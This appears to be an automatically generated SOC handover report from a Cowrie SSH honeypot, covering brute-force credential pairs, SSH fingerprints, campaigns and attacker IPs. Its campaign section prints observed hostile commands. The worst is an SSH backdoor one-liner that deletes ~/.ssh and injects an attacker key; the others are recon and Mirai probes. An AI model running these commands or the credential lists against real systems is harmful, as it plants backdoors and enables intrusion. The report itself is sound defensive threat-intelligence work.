# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-04 |
| **Generated At** | 2026-09-04T14:07:09Z |
| **Shift Time** | 14:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **352** |
| Confirmed Threats | **317** |
| False Positives Filtered | **35** (9.9%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **32** |
| High Severity Cases | **222** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **129** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **257** |
| Unique Credential Pairs | **200** |
| Unique Usernames | **57** |
| Unique Passwords | **117** |
| Successful Auth Pairs | **234** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 89 |
| `admin` | 39 |
| `debian` | 14 |
| `345gs5662d34` | 13 |
| `support` | 11 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 12 |
| `123456` | 11 |
| `12345678` | 11 |
| `support` | 11 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `support` | `support` | 11 |
| `admin` | `admin` | 6 |
| `root` | `123456` | 3 |
| `root` | `12345678` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin` | `219.78.63.235` | 2026-09-04T06:58:29 |
| `root` | `1234567` | `195.178.110.232` | 2026-09-04T06:59:35 |
| `root` | `12345678` | `195.178.110.232` | 2026-09-04T07:01:40 |
| `admin` | `admin` | `61.146.235.54` | 2026-09-04T07:03:07 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-04T07:03:12 |
| `root` | `1Qazxsw2` | `217.60.255.130` | 2026-09-04T07:03:40 |
| `root` | `123456789` | `195.178.110.232` | 2026-09-04T07:03:42 |
| `support` | `support` | `176.53.159.196` | 2026-09-04T07:05:14 |
| `root` | `1234567890` | `195.178.110.232` | 2026-09-04T07:06:01 |
| `root` | `123abc` | `195.178.110.232` | 2026-09-04T07:08:20 |
| `root` | `1q2w3e4r` | `195.178.110.232` | 2026-09-04T07:10:40 |
| `root` | `P@ssw0rd123` | `195.178.110.232` | 2026-09-04T07:12:56 |
| `root` | `Welcome123456` | `217.60.255.130` | 2026-09-04T07:14:40 |
| `root` | `abc123` | `195.178.110.232` | 2026-09-04T07:15:06 |
| `root` | `admin123` | `195.178.110.232` | 2026-09-04T07:17:05 |
| `root` | `letmein` | `195.178.110.232` | 2026-09-04T07:18:38 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-04T07:19:48 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-04T07:19:49 |
| `root` | `pass123` | `195.178.110.232` | 2026-09-04T07:20:06 |
| `admin` | `admin` | `156.227.234.198` | 2026-09-04T07:20:54 |
| `root` | `password` | `195.178.110.232` | 2026-09-04T07:21:25 |
| `user` | `user` | `156.227.234.198` | 2026-09-04T07:21:58 |
| `root` | `password1` | `195.178.110.232` | 2026-09-04T07:22:29 |
| `root` | `qwerty123` | `195.178.110.232` | 2026-09-04T07:23:33 |
| `root` | `root123` | `195.178.110.232` | 2026-09-04T07:24:36 |
| `root` | `asdfg.123456` | `217.60.255.130` | 2026-09-04T07:25:35 |
| `root` | `welcome` | `195.178.110.232` | 2026-09-04T07:25:39 |
| `aswin` | `aswin` | `223.109.49.166` | 2026-09-04T07:26:21 |
| `345gs5662d34` | `345gs5662d34` | `223.109.49.166` | 2026-09-04T07:26:26 |
| `aswin` | `3245gs5662d34` | `223.109.49.166` | 2026-09-04T07:26:28 |
| `admin` | `123` | `195.178.110.232` | 2026-09-04T07:26:40 |
| `admin` | `1234` | `195.178.110.232` | 2026-09-04T07:27:41 |
| `admin` | `12345` | `195.178.110.232` | 2026-09-04T07:28:41 |
| `admin` | `123456` | `195.178.110.232` | 2026-09-04T07:29:38 |
| `support` | `support` | `10.0.0.73` | 2026-09-04T07:29:53 |
| `admin` | `1234567` | `195.178.110.232` | 2026-09-04T07:30:40 |
| `admin` | `12345678` | `195.178.110.232` | 2026-09-04T07:31:31 |
| `admin` | `123456789` | `195.178.110.232` | 2026-09-04T07:32:31 |
| `admin` | `1234567890` | `195.178.110.232` | 2026-09-04T07:33:22 |
| `admin` | `1q2w3e4r` | `195.178.110.232` | 2026-09-04T07:34:10 |
| `admin` | `P@ssw0rd123` | `195.178.110.232` | 2026-09-04T07:35:11 |
| `admin` | `abc123` | `195.178.110.232` | 2026-09-04T07:36:04 |
| `root` | `passw0rd!@` | `217.60.255.130` | 2026-09-04T07:36:33 |
| `admin` | `admin123` | `195.178.110.232` | 2026-09-04T07:36:58 |
| `admin` | `letmein` | `195.178.110.232` | 2026-09-04T07:37:50 |
| `admin` | `pass123` | `195.178.110.232` | 2026-09-04T07:38:37 |
| `admin` | `password` | `195.178.110.232` | 2026-09-04T07:39:34 |
| `admin` | `password1` | `195.178.110.232` | 2026-09-04T07:40:27 |
| `admin` | `qwerty123` | `195.178.110.232` | 2026-09-04T07:41:25 |
| `admin` | `root123` | `195.178.110.232` | 2026-09-04T07:42:23 |
| `admin1` | `123` | `195.178.110.232` | 2026-09-04T07:43:14 |
| `admin` | `admin` | `196.190.92.28` | 2026-09-04T07:43:17 |
| `admin1` | `1234` | `195.178.110.232` | 2026-09-04T07:44:10 |
| `admin1` | `admin123` | `195.178.110.232` | 2026-09-04T07:45:00 |
| `admin1` | `password1` | `195.178.110.232` | 2026-09-04T07:45:51 |
| `admin1` | `qwerty123` | `195.178.110.232` | 2026-09-04T07:46:46 |
| `administrator` | `123` | `195.178.110.232` | 2026-09-04T07:47:31 |
| `root` | `Atieh@123` | `217.60.255.130` | 2026-09-04T07:47:33 |
| `administrator` | `1234` | `195.178.110.232` | 2026-09-04T07:48:30 |
| `administrator` | `123abc` | `195.178.110.232` | 2026-09-04T07:49:22 |
| `administrator` | `1q2w3e4r` | `195.178.110.232` | 2026-09-04T07:50:17 |
| `administrator` | `admin123` | `195.178.110.232` | 2026-09-04T07:51:11 |
| `root` | `Gl123456` | `138.197.164.175` | 2026-09-04T07:52:00 |
| `345gs5662d34` | `345gs5662d34` | `138.197.164.175` | 2026-09-04T07:52:02 |
| `root` | `3245gs5662d34` | `138.197.164.175` | 2026-09-04T07:52:02 |
| `administrator` | `qwerty123` | `195.178.110.232` | 2026-09-04T07:52:03 |
| `apache` | `1234` | `195.178.110.232` | 2026-09-04T07:52:58 |
| `backup` | `123` | `195.178.110.232` | 2026-09-04T07:53:46 |
| `backup` | `12345678` | `195.178.110.232` | 2026-09-04T07:54:47 |
| `backup` | `password` | `195.178.110.232` | 2026-09-04T07:55:31 |
| `daemon` | `123456` | `195.178.110.232` | 2026-09-04T07:56:23 |
| `daemon` | `abc123` | `195.178.110.232` | 2026-09-04T07:57:21 |
| `debian` | `123` | `195.178.110.232` | 2026-09-04T07:58:11 |
| `root` | `Aseman@123` | `217.60.255.130` | 2026-09-04T07:58:34 |
| `debian` | `1234` | `195.178.110.232` | 2026-09-04T07:59:10 |
| `debian` | `12345` | `195.178.110.232` | 2026-09-04T07:59:56 |
| `debian` | `123456` | `195.178.110.232` | 2026-09-04T08:00:44 |
| `debian` | `12345678` | `195.178.110.232` | 2026-09-04T08:01:34 |
| `debian` | `123456789` | `195.178.110.232` | 2026-09-04T08:02:23 |
| `debian` | `1234567890` | `195.178.110.232` | 2026-09-04T08:03:16 |
| `debian` | `1q2w3e4r` | `195.178.110.232` | 2026-09-04T08:03:58 |
| `debian` | `abc123` | `195.178.110.232` | 2026-09-04T08:04:45 |
| `debian` | `admin123` | `195.178.110.232` | 2026-09-04T08:05:24 |
| `debian` | `letmein` | `195.178.110.232` | 2026-09-04T08:06:06 |
| `debian` | `pass123` | `195.178.110.232` | 2026-09-04T08:06:46 |
| `debian` | `password` | `195.178.110.232` | 2026-09-04T08:07:23 |
| `debian` | `qwerty123` | `195.178.110.232` | 2026-09-04T08:08:05 |
| `deploy` | `123` | `195.178.110.232` | 2026-09-04T08:08:44 |
| `root` | `Exir@123` | `217.60.255.130` | 2026-09-04T08:09:35 |
| `root` | `xc3511` | `193.169.127.6` | 2026-09-04T08:15:34 |
| `deploy` | `1234567890` | `195.178.110.232` | 2026-09-04T08:17:47 |
| `deploy` | `1q2w3e4r` | `195.178.110.232` | 2026-09-04T08:18:29 |
| `deploy` | `admin123` | `195.178.110.232` | 2026-09-04T08:19:10 |
| `root` | `qq123456789` | `217.60.255.130` | 2026-09-04T08:20:37 |
| `root` | `centos` | `180.76.61.232` | 2026-09-04T08:29:48 |
| `root` | `Qwe123456` | `217.60.255.130` | 2026-09-04T08:31:44 |
| `root` | `abc@12345` | `217.60.255.130` | 2026-09-04T08:42:47 |
| `root` | `@admin123` | `217.60.255.130` | 2026-09-04T08:53:43 |
| `admin` | `admin` | `80.89.199.242` | 2026-09-04T08:58:17 |
| `root` | `qwer1234!@#$` | `217.60.255.130` | 2026-09-04T09:04:46 |
| `root` | `Aa123456789!` | `217.60.255.130` | 2026-09-04T09:15:52 |
| `root` | `---fuck_you----` | `118.196.96.129` | 2026-09-04T09:22:05 |
| `root` | `1q2w3e4R` | `217.60.255.130` | 2026-09-04T09:26:49 |
| `root` | `abc@123456` | `217.60.255.130` | 2026-09-04T09:37:51 |
| `root` | `Pass@word` | `217.60.255.130` | 2026-09-04T09:48:55 |
| `b'\x16\x03\x03\x02c\x01\x00\x02_\x03\x03"\x98 \xfc\x01/\xfb.\x11\x07\xe8\xce\x93pws\xda\xe8\xf4Aw"(\xcd\xc3\x06J\xed9,"k 3\xd8\x1d*\xe8\xd4\xe1I\xe8\xd3*\xaf\xa0\x86\xe23\xdf\xae\xa0`\xc8\xe0\xa0\xf2\x82<\xf0\x15\x07`\xaf\x93\x00\x8a\x00\x16\x003\x00g\xc0\x9e\xc0\xa2\x00\x9e\x009\x00k\xc0\x9f\xc0\xa3\x00\x9f\x00E\x00\xbe\x00\x88\x00\xc4\x00\x9a\xc0\x08\xc0\t\xc0#\xc0\xac\xc0\xae\xc0+\xc0'` | `b"\xc0$\xc0\xad\xc0\xaf\xc0,\xc0r\xc0s\xcc\xa9\x13\x02\x13\x01\xcc\x14\xc0\x07\xc0\x12\xc0\x13\xc0'\xc0/\xc0\x14\xc0(\xc00\xc0`\xc0a\xc0v\xc0w\xcc\xa8\x13\x05\x13\x04\x13\x03\xcc\x13\xc0\x11\x00"` | `195.184.76.125` | 2026-09-04T09:51:10 |
| `b'\x00/\x00<\xc0\x9c\xc0\xa0\x00\x9c\x005\x00=\xc0\x9d\xc0\xa1\x00\x9d\x00A\x00\xba\x00\x84\x00\xc0\x00\x07\x00\x04\x00\x05\x01\x00\x01\x8c\x00\x00\x00\x13\x00\x11\x00\x00\x0e129.80.119.236\x00\x0b\x00\x04\x03\x00\x01\x02\x00'` | `  ` | `195.184.76.125` | 2026-09-04T09:51:10 |
| `root` | `2wsx@WSX` | `217.60.255.130` | 2026-09-04T10:00:01 |
| `share` | `12345678` | `103.213.238.91` | 2026-09-04T10:06:58 |
| `345gs5662d34` | `345gs5662d34` | `103.213.238.91` | 2026-09-04T10:07:03 |
| `share` | `3245gs5662d34` | `103.213.238.91` | 2026-09-04T10:07:05 |
| `root` | `qwer123!@#` | `217.60.255.130` | 2026-09-04T10:11:02 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-09-04T10:20:51 |
| `root` | `thanh123` | `217.60.255.130` | 2026-09-04T10:22:03 |
| `sarah` | `sarah123` | `10.0.0.73` | 2026-09-04T10:32:54 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-04T10:33:00 |
| `sarah` | `3245gs5662d34` | `10.0.0.73` | 2026-09-04T10:33:03 |
| `root` | `qq123456` | `217.60.255.130` | 2026-09-04T10:33:08 |
| `dev` | `devtest` | `10.0.0.73` | 2026-09-04T10:37:23 |
| `dev` | `3245gs5662d34` | `10.0.0.73` | 2026-09-04T10:37:27 |
| `root` | `Arian1405` | `217.60.255.130` | 2026-09-04T10:44:09 |
| `b'\x16\x03\x03\x02c\x01\x00\x02_\x03\x03?l\xde\xce4\x8em\xae\x11\xb1L_\x92c\t\xb3\x1a\xec#>\x9f\xf1\x80y>\xcf\x80\x06\xc9\xdfm\xf3 W\rs\x0c.\x1b\xa2\xb81\x16\xc7y3\xf7\xc1s\xf1"p)\xdf\xcf\xab\xdd\xect\xf2\xe1O\xacC\xeb\x00\x8a\x00\x16\x003\x00g\xc0\x9e\xc0\xa2\x00\x9e\x009\x00k\xc0\x9f\xc0\xa3\x00\x9f\x00E\x00\xbe\x00\x88\x00\xc4\x00\x9a\xc0\x08\xc0\t\xc0#\xc0\xac\xc0\xae\xc0+\xc0'` | `b"\xc0$\xc0\xad\xc0\xaf\xc0,\xc0r\xc0s\xcc\xa9\x13\x02\x13\x01\xcc\x14\xc0\x07\xc0\x12\xc0\x13\xc0'\xc0/\xc0\x14\xc0(\xc00\xc0`\xc0a\xc0v\xc0w\xcc\xa8\x13\x05\x13\x04\x13\x03\xcc\x13\xc0\x11\x00"` | `91.230.168.213` | 2026-09-04T10:47:57 |
| `b'\x00/\x00<\xc0\x9c\xc0\xa0\x00\x9c\x005\x00=\xc0\x9d\xc0\xa1\x00\x9d\x00A\x00\xba\x00\x84\x00\xc0\x00\x07\x00\x04\x00\x05\x01\x00\x01\x8c\x00\x00\x00\x13\x00\x11\x00\x00\x0e129.80.119.236\x00\x0b\x00\x04\x03\x00\x01\x02\x00'` | `  ` | `91.230.168.213` | 2026-09-04T10:47:57 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `172.236.228.38` | 2026-09-04T10:53:33 |
| `root` | `Sepehr123@` | `217.60.255.130` | 2026-09-04T10:55:10 |
| `root` | `Arvan@1405` | `217.60.255.130` | 2026-09-04T11:06:12 |
| `tst` | `tst` | `10.0.0.73` | 2026-09-04T11:08:06 |
| `tst` | `3245gs5662d34` | `10.0.0.73` | 2026-09-04T11:08:11 |
| `root` | `password` | `80.94.92.234` | 2026-09-04T11:08:16 |
| `root` | `admin` | `80.94.92.234` | 2026-09-04T11:09:31 |
| `root` | `toor` | `80.94.92.234` | 2026-09-04T11:10:49 |
| `root` | `12345` | `80.94.92.234` | 2026-09-04T11:12:11 |
| `root` | `123456789` | `80.94.92.234` | 2026-09-04T11:13:30 |
| `root` | `12345678` | `80.94.92.234` | 2026-09-04T11:14:46 |
| `root` | `passw0rd` | `80.94.92.234` | 2026-09-04T11:16:03 |
| `user04` | `123456` | `10.0.0.73` | 2026-09-04T11:16:27 |
| `root` | `admin123` | `80.94.92.234` | 2026-09-04T11:17:19 |
| `root` | `Cloud@2026` | `217.60.255.130` | 2026-09-04T11:17:29 |
| `automation` | `12345678` | `10.0.0.73` | 2026-09-04T11:18:25 |
| `automation` | `3245gs5662d34` | `10.0.0.73` | 2026-09-04T11:18:27 |
| `root` | `1234` | `80.94.92.234` | 2026-09-04T11:18:35 |
| `root` | `qwerty` | `80.94.92.234` | 2026-09-04T11:19:50 |
| `root` | `letmein` | `80.94.92.234` | 2026-09-04T11:21:06 |
| `root` | `Password1` | `80.94.92.234` | 2026-09-04T11:22:22 |
| `root` | `123123` | `80.94.92.234` | 2026-09-04T11:23:40 |
| `root` | `111111` | `80.94.92.234` | 2026-09-04T11:24:57 |
| `root` | `default` | `80.94.92.234` | 2026-09-04T11:26:17 |
| `root` | `system` | `80.94.92.234` | 2026-09-04T11:27:37 |
| `root` | `ZXCzxc123` | `217.60.255.130` | 2026-09-04T11:28:41 |
| `admin` | `123456` | `80.94.92.234` | 2026-09-04T11:30:09 |
| `admin` | `password` | `80.94.92.234` | 2026-09-04T11:31:30 |
| `admin` | `admin` | `80.94.92.234` | 2026-09-04T11:33:05 |
| `admin` | `admin123` | `80.94.92.234` | 2026-09-04T11:34:19 |
| `admin` | `12345` | `80.94.92.234` | 2026-09-04T11:35:35 |
| `admin` | `123456789` | `80.94.92.234` | 2026-09-04T11:36:48 |
| `admin` | `passw0rd` | `80.94.92.234` | 2026-09-04T11:38:05 |
| `admin` | `12345678` | `80.94.92.234` | 2026-09-04T11:39:22 |
| `root` | `Software123` | `217.60.255.130` | 2026-09-04T11:39:50 |
| `admin` | `Administrator` | `80.94.92.234` | 2026-09-04T11:40:39 |
| `root` | `op` | `165.154.202.254` | 2026-09-04T11:41:51 |
| `345gs5662d34` | `345gs5662d34` | `165.154.202.254` | 2026-09-04T11:41:53 |
| `root` | `3245gs5662d34` | `165.154.202.254` | 2026-09-04T11:41:54 |
| `admin` | `1234` | `80.94.92.234` | 2026-09-04T11:41:59 |
| `admin` | `welcome` | `80.94.92.234` | 2026-09-04T11:43:17 |
| `admin` | `qwerty` | `80.94.92.234` | 2026-09-04T11:44:32 |
| `admin` | `letmein` | `80.94.92.234` | 2026-09-04T11:45:51 |
| `admin` | `password1` | `80.94.92.234` | 2026-09-04T11:47:10 |
| `eth-docker` | `eth-docker` | `45.148.10.240` | 2026-09-04T11:47:14 |
| `admin` | `123123` | `80.94.92.234` | 2026-09-04T11:48:25 |
| `ethdocker` | `ethdocker` | `45.148.10.240` | 2026-09-04T11:48:53 |
| `admin` | `111111` | `80.94.92.234` | 2026-09-04T11:49:41 |
| `sol` | `sol` | `45.148.10.240` | 2026-09-04T11:50:27 |
| `root` | `1234!` | `217.60.255.130` | 2026-09-04T11:50:55 |
| `dell` | `dell` | `187.251.123.104` | 2026-09-04T11:51:49 |
| `345gs5662d34` | `345gs5662d34` | `187.251.123.104` | 2026-09-04T11:51:51 |
| `dell` | `3245gs5662d34` | `187.251.123.104` | 2026-09-04T11:51:52 |
| `sol` | `1234` | `45.148.10.240` | 2026-09-04T11:52:02 |
| `sol` | `123` | `45.148.10.240` | 2026-09-04T11:53:37 |
| `sol` | `Solana` | `45.148.10.240` | 2026-09-04T11:55:09 |
| `sol` | `solana` | `45.148.10.240` | 2026-09-04T11:56:39 |
| `solana` | `solana` | `45.148.10.240` | 2026-09-04T11:58:12 |
| `solv` | `123456` | `45.148.10.240` | 2026-09-04T11:59:48 |
| `sniper` | `sniper` | `45.148.10.240` | 2026-09-04T12:01:24 |
| `root` | `qwerty` | `217.60.255.130` | 2026-09-04T12:02:08 |
| `jun` | `123` | `10.0.0.73` | 2026-09-04T12:02:39 |
| `jun` | `3245gs5662d34` | `10.0.0.73` | 2026-09-04T12:02:41 |
| `scraper` | `scraper` | `45.148.10.240` | 2026-09-04T12:02:59 |
| `solv` | `12345678` | `45.148.10.240` | 2026-09-04T12:04:39 |
| `hummingbot` | `hummingbot` | `45.148.10.240` | 2026-09-04T12:06:19 |
| `test12` | `1234` | `10.0.0.73` | 2026-09-04T12:07:36 |
| `test12` | `3245gs5662d34` | `10.0.0.73` | 2026-09-04T12:07:38 |
| `freqtrade` | `freqtrade` | `45.148.10.240` | 2026-09-04T12:07:54 |
| `ollama` | `ollama` | `45.148.10.240` | 2026-09-04T12:09:25 |
| `jito` | `jito` | `45.148.10.240` | 2026-09-04T12:11:00 |
| `tensorflow` | `tensorflow` | `45.148.10.240` | 2026-09-04T12:12:37 |
| `root` | `1234@abcd` | `217.60.255.130` | 2026-09-04T12:13:21 |
| `oneadmin` | `opennebula` | `45.148.10.240` | 2026-09-04T12:14:12 |
| `root` | `eve` | `45.148.10.240` | 2026-09-04T12:15:47 |
| `gns3` | `gns3` | `45.148.10.240` | 2026-09-04T12:17:28 |
| `vyos` | `vyos` | `45.148.10.240` | 2026-09-04T12:19:12 |
| `tensor` | `tensor` | `45.148.10.240` | 2026-09-04T12:20:49 |
| `user` | `1` | `45.148.10.240` | 2026-09-04T12:22:22 |
| `user` | `123456` | `45.148.10.240` | 2026-09-04T12:23:57 |
| `user1` | `user1` | `45.148.10.240` | 2026-09-04T12:25:36 |
| `john` | `john` | `45.148.10.240` | 2026-09-04T12:27:10 |
| `bonito` | `bonito` | `45.148.10.240` | 2026-09-04T12:28:42 |
| `nemo` | `nemo` | `45.148.10.240` | 2026-09-04T12:30:22 |
| `artemis` | `artemis` | `45.148.10.240` | 2026-09-04T12:32:07 |
| `supermaint` | `z4ng0rber` | `23.29.118.224` | 2026-09-04T12:32:47 |
| `345gs5662d34` | `345gs5662d34` | `23.29.118.224` | 2026-09-04T12:32:48 |
| `supermaint` | `3245gs5662d34` | `23.29.118.224` | 2026-09-04T12:32:48 |
| `asterisk` | `asterisk` | `45.148.10.240` | 2026-09-04T12:33:48 |
| `root` | `111111` | `80.94.92.179` | 2026-09-04T12:34:52 |
| `grid` | `grid` | `45.148.10.240` | 2026-09-04T12:35:24 |
| `root` | `zxcvbnm` | `217.60.255.130` | 2026-09-04T12:36:17 |
| `erp` | `erp` | `45.148.10.240` | 2026-09-04T12:37:02 |
| `root` | `123` | `80.94.92.179` | 2026-09-04T12:37:13 |
| `erp` | `erp@123` | `45.148.10.240` | 2026-09-04T12:38:42 |
| `root` | `123123` | `80.94.92.179` | 2026-09-04T12:39:25 |
| `frappe` | `frappe@123` | `45.148.10.240` | 2026-09-04T12:40:16 |
| `root` | `123321` | `80.94.92.179` | 2026-09-04T12:41:40 |
| `frappe` | `frappe123` | `45.148.10.240` | 2026-09-04T12:41:50 |
| `frappe` | `123456` | `45.148.10.240` | 2026-09-04T12:43:30 |
| `root` | `1234` | `80.94.92.179` | 2026-09-04T12:43:53 |
| `frappe` | `12345678` | `45.148.10.240` | 2026-09-04T12:45:13 |
| `root` | `12345` | `80.94.92.179` | 2026-09-04T12:46:03 |
| `claude` | `claude` | `45.148.10.240` | 2026-09-04T12:46:55 |
| `root` | `!QAZ2wsx#EDC4rfv` | `217.60.255.130` | 2026-09-04T12:47:23 |
| `codex` | `codex` | `45.148.10.240` | 2026-09-04T12:48:37 |
| `gemini` | `gemini` | `45.148.10.240` | 2026-09-04T12:50:21 |
| `root` | `1234567` | `80.94.92.179` | 2026-09-04T12:50:32 |
| `ubuntu` | `ubuntu` | `45.148.10.240` | 2026-09-04T12:52:01 |
| `root` | `12345678` | `80.94.92.179` | 2026-09-04T12:52:50 |
| `ubuntu` | `ubuntu@123` | `45.148.10.240` | 2026-09-04T12:53:38 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **352** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 174 |
| libssh | 62 |
| OpenSSH | 5 |
| Paramiko (Python) | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 115 | 3 |
| `16443846184e...` | Generic scanner | 44 | 3 |
| `419da4c91ddb...` | Modern SSH client | 32 | 1 |
| `f555226df196...` | Mirai/variant | 19 | 7 |
| `4e066189c3bb...` | Generic scanner | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 115 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 44 | 3 | Generic scanner |
| `419da4c91ddb...` | libssh | 32 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 19 | 7 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 5 | — |
| `4e066189c3bb...` | Go SSH scanner | 6 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 5 | 1 | Modern SSH client |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 110 | 3 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.232`, `80.94.92.179`, `80.94.92.234`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
/bin/busybox TOKEN
```
Source IPs: `193.169.127.6`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.202.254`, `138.197.164.175`, `23.29.118.224`, `103.213.238.91`, `223.109.49.166`, `187.251.123.104`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **55** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 19 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS213412` | ONYPHE SAS | 4 | LOW |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS27747` | Telecentro S.A. | 2 | HIGH |
| `AS272066` | FIBRAZUL INTERNET S.R.L. | 1 | LOW |
| `AS6849` | JSC Ukrtelecom | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (221)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-21b712bd66c9

| Field | Detail |
|---|---|
| **Source IP** | `219.78.63[.]235` |
| **First Seen** | 2026-09-04 06:58 |
| **Last Seen** | 2026-09-04 06:58 |
| **Session Duration** | 14s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:58:26` | `cowrie.session.connect` |
| `2026-09-04 06:58:26` | `cowrie.client.version` |
| `2026-09-04 06:58:26` | `cowrie.client.kex` |
| `2026-09-04 06:58:28` | `cowrie.login.failed` |
| `2026-09-04 06:58:29` | `cowrie.login.success` |
| `2026-09-04 06:58:30` | `cowrie.session.params` |
| `2026-09-04 06:58:30` | `cowrie.command.input` |
| `2026-09-04 06:58:30` | `cowrie.command.failed` |
| `2026-09-04 06:58:31` | `cowrie.log.closed` |
| `2026-09-04 06:58:32` | `cowrie.session.params` |
| `2026-09-04 06:58:32` | `cowrie.command.input` |
| `2026-09-04 06:58:32` | `cowrie.log.closed` |
| `2026-09-04 06:58:33` | `cowrie.session.params` |
| `2026-09-04 06:58:33` | `cowrie.command.input` |
| `2026-09-04 06:58:33` | `cowrie.log.closed` |
| `2026-09-04 06:58:34` | `cowrie.session.params` |
| `2026-09-04 06:58:34` | `cowrie.command.input` |
| `2026-09-04 06:58:35` | `cowrie.log.closed` |
| `2026-09-04 06:58:36` | `cowrie.session.params` |
| `2026-09-04 06:58:36` | `cowrie.command.input` |
| `2026-09-04 06:58:36` | `cowrie.log.closed` |
| `2026-09-04 06:58:37` | `cowrie.session.params` |
| `2026-09-04 06:58:37` | `cowrie.command.input` |
| `2026-09-04 06:58:37` | `cowrie.log.closed` |
